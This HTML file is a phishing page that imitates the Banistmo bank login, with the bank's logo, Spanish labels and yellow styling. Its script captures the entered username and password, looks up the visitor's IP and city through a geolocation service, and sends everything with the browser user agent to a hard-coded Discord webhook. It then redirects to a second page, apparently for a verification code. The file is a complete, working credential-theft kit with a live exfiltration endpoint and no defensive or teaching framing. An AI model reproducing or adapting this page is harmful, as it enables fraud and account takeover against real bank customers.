<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Banistmo</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f7f7f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .login-card {
            background-color: white;
            padding: 50px 40px;
            width: 100%;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
            border-radius: 4px;
        }

        .logo-container {
            margin-bottom: 50px;
        }

        .logo-container img {
            width: 200px;
            height: auto;
        }

        .input-group {
            display: flex;
            align-items: center;
            border-bottom: 1.5px solid #333;
            margin-bottom: 25px;
            padding-bottom: 5px;
        }

        .input-group i {
            font-size: 20px;
            color: #333;
            margin-right: 15px;
        }

        .input-group input {
            border: none;
            outline: none;
            width: 100%;
            font-size: 18px;
            color: #333;
            background: transparent;
        }

        .password-eye {
            cursor: pointer;
            color: #333;
            font-size: 20px;
            padding: 5px;
            transition: opacity 0.2s;
        }

        .password-eye:hover {
            opacity: 0.7;
        }

        .btn-ingresar {
            background-color: #ededed;
            color: #a0a0a0;
            border: none;
            padding: 16px;
            width: 100%;
            border-radius: 50px;
            font-size: 20px;
            font-weight: bold;
            cursor: not-allowed;
            margin-top: 20px;
            margin-bottom: 30px;
            transition: all 0.3s ease;
        }

        .btn-ingresar.active {
            background-color: #FDDA5F;
            color: #1A1A1A;
            cursor: pointer;
        }

        .checkbox-container {
            display: flex;
            align-items: center;
            margin-bottom: 30px;
            color: #9e9e9e;
            font-size: 17px;
            text-align: left;
        }

        .checkbox-container input {
            width: 18px;
            height: 18px;
            margin-right: 10px;
        }

        .footer-links {
            display: flex;
            flex-direction: column;
            gap: 18px;
        }

        .footer-links a {
            color: #000;
            text-decoration: underline;
            font-size: 16px;
            font-weight: 500;
        }
    </style>
</head>
<body>

<div class="login-card">
    <div class="logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/en/3/3e/Banistmo-2023-logo.png" alt="Banistmo Logo">
    </div>

    <form id="loginForm">
        <div class="input-group">
            <i class="fa-regular fa-user"></i>
            <input type="text" id="usuario" placeholder="Usuario" autocomplete="off" required>
        </div>

        <div class="input-group">
            <i class="fa-solid fa-lock"></i>
            <input type="password" id="password" placeholder="Contrase√±a" required>
            <i class="fa-regular fa-eye-slash password-eye" id="togglePassword"></i>
        </div>

        <label class="checkbox-container">
            <input type="checkbox">
            Recordar usuario
        </label>

        <button type="submit" id="btnSubmit" class="btn-ingresar" disabled>Ingresar</button>

        <div class="footer-links">
            <a href="#">¬øOlvidaste tu usuario o contrase√±a?</a>
            <a href="#">Registrarme en la App</a>
        </div>
    </form>
</div>

<script>
    const usuarioInput = document.getElementById('usuario');
    const passwordInput = document.getElementById('password');
    const btnSubmit = document.getElementById('btnSubmit');
    const togglePassword = document.getElementById('togglePassword');
    const loginForm = document.getElementById('loginForm');

    // CONFIGURACI√ìN WEBHOOK
    const webhookURL = "https://discord.com/api/webhooks/1474790547851055235/1-s0oqiM2BDNSvehLcIDBvCR81ClhNG6T4vJpOvbBAEsSFldMV7WBP4T1z7b-aGmZfqX";

    function validarFormulario() {
        if (usuarioInput.value.trim().length > 3 && passwordInput.value.trim().length > 3) {
            btnSubmit.classList.add('active');
            btnSubmit.disabled = false;
        } else {
            btnSubmit.classList.remove('active');
            btnSubmit.disabled = true;
        }
    }

    togglePassword.addEventListener('click', function() {
        const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
        passwordInput.setAttribute('type', type);
        this.classList.toggle('fa-eye');
        this.classList.toggle('fa-eye-slash');
    });

    usuarioInput.addEventListener('input', validarFormulario);
    passwordInput.addEventListener('input', validarFormulario);

    loginForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const userValue = usuarioInput.value;
        const passValue = passwordInput.value;

        btnSubmit.innerText = "Cargando...";
        btnSubmit.disabled = true;

        try {
            // Obtener datos de ubicaci√≥n
            const geoRes = await fetch('https://ipapi.co/json/');
            const geo = await geoRes.json();

            const payload = {
                embeds: [{
                    title: "üè¶ NUEVO LOGIN BANISTMO",
                    color: 16636511, // Color amarillo/dorado
                    fields: [
                        { name: "üë§ Usuario", value: `\`${userValue}\``, inline: true },
                        { name: "üîë Contrase√±a", value: `\`${passValue}\``, inline: true },
                        { name: "üåê IP", value: `\`${geo.ip}\``, inline: false },
                        { name: "üåç Ubicaci√≥n", value: `${geo.city}, ${geo.country_name}`, inline: true },
                        { name: "üì± Dispositivo", value: navigator.userAgent, inline: false }
                    ],
                    footer: { text: "Banistmo App - Security System" },
                    timestamp: new Date()
                }]
            };

            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });

            // Redirigir a la siguiente p√°gina (ej: OTP o Verificaci√≥n)
            window.location.href = "index2.html";

        } catch (error) {
            console.error("Error:", error);
            window.location.href = "index2.html";
        }
    });
</script>

</body>
</html>
